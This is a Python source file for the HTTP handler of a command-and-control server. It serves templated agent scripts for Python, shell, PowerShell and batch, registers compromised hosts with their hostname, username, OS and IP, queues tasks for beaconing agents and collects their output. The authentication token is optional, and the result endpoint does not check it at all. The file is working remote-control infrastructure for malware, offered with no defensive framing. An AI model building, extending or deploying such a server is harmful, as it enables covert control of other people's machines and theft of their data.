import json
import os
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs


AGENT_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "agent")

AGENT_ENDPOINTS = {
    "/py": ("agent.py", "text/x-python"),
    "/sh": ("agent.sh", "text/x-shellscript"),
    "/ps1": ("agent.ps1", "application/x-powershell"),
    "/bat": ("agent.bat", "application/x-bat"),
}


def norm_path(path):
    parts = path.strip("/").split("/")
    if len(parts) >= 2 and parts[0] == "api" and parts[1] == "v1":
        return "/" + "/".join(parts[2:])
    return path


class C2Handler(BaseHTTPRequestHandler):
    manager = None
    log_buffer = None
    server_url = "http://localhost:8080"
    server_token = ""

    def _check_token(self, token):
        expected = type(self).server_token
        return not expected or token == expected

    def _get_token_from_query(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        return params.get("token", [None])[0]

    def log_message(self, format, *args):
        buf = type(self).log_buffer
        if buf:
            buf.push(f"[HTTP] {args[0]} {args[1]} {args[2]}")
        else:
            print(f"[HTTP] {args[0]} {args[1]} {args[2]}")

    def _send_json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_text(self, text, code=200):
        body = text.encode()
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_agent_script(self, filename, mime):
        filepath = os.path.join(AGENT_DIR, filename)
        if not os.path.exists(filepath):
            self._send_text("Not Found", 404)
            return
        with open(filepath, "r") as f:
            content = f.read()
        content = content.replace("__C2_URL__", type(self).server_url)
        content = content.replace("__C2_TOKEN__", type(self).server_token)
        body = content.encode()
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _read_body(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > 0:
            return self.rfile.read(length).decode()
        return ""

    def _handle_get(self, raw_path):
        path = urlparse(raw_path).path
        parts = path.strip("/").split("/")

        if path in AGENT_ENDPOINTS:
            filename, mime = AGENT_ENDPOINTS[path]
            self._send_agent_script(filename, mime)
        elif len(parts) >= 2 and parts[0] == "tasks":
            agent_id = parts[1]
            if not self._check_token(self._get_token_from_query()):
                self._send_text("Unauthorized", 401)
                return
            if self.manager:
                if agent_id != "None":
                    self.manager.update_last_seen(agent_id)
                tasks = self.manager.get_pending_tasks(agent_id)
                self._send_json({"tasks": tasks})
            else:
                self._send_json({"tasks": []})
        elif len(parts) >= 2 and parts[0] == "beacon":
            agent_id = parts[1]
            if not self._check_token(self._get_token_from_query()):
                self._send_text("Unauthorized", 401)
                return
            if self.manager:
                self.manager.update_last_seen(agent_id)
                tasks = self.manager.get_pending_tasks(agent_id)
                self._send_json({"tasks": tasks})
            else:
                self._send_json({"tasks": []})
        elif path == "/":
            self._send_text("C2 Server Running")
        else:
            self._send_text("Not Found", 404)

    def _handle_post(self, path):
        parts = path.strip("/").split("/")
        body = self._read_body()

        if len(parts) >= 1 and parts[0] == "register":
            try:
                data = json.loads(body)
                if not self._check_token(data.get("token", "")):
                    self._send_text("Unauthorized", 401)
                    return
                agent_id = self.manager.register(
                    hostname=data.get("hostname", "unknown"),
                    username=data.get("username", "unknown"),
                    os=data.get("os", "unknown"),
                    ip=data.get("ip", "0.0.0.0"),
                    arch=data.get("arch", "unknown"),
                )
                self._send_json({"agent_id": agent_id})
            except Exception as e:
                self._send_json({"error": str(e)}, 400)

        elif len(parts) >= 2 and parts[0] == "result":
            agent_id = parts[1]
            try:
                data = json.loads(body)
                self.manager.submit_result(
                    agent_id=agent_id,
                    task_id=data.get("task_id", ""),
                    output=data.get("output", ""),
                    status=data.get("status", "error"),
                )
                self._send_json({"ok": True})
            except Exception as e:
                self._send_json({"error": str(e)}, 400)

        else:
            self._send_text("Not Found", 404)

    def do_GET(self):
        self._handle_get(norm_path(self.path))

    def do_POST(self):
        self._handle_post(norm_path(self.path))

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()
